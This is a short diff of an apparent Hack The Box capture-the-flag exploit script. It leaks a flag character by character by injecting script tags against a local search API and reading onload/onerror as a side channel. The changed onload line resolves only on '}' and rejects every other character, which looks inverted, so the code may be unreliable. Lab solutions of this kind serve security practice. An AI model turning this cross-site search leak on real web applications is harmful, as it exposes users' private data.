@@ -3,13 +3,13 @@
     var ip = "127.0.0.1:1337"; // HTB Server IP Address
     var flag = "HTB{"; // init search word
     var letters =
-      "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
+      "-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
     var url = `http://${ip}/api/entries/search?q=`;
     async function getLetter(ch) {
       return new Promise((resolve, reject) => {
         const script = document.createElement("script");
         script.src = url + encodeURIComponent(flag + ch);
-        script.onload = () => (ch === "}" ? reject(ch) : resolve(ch));
+        script.onload = () => (ch === "}" ? resolve(ch) : reject(ch));
         script.onerror = () => reject(ch);
         document.head.appendChild(script);
       });
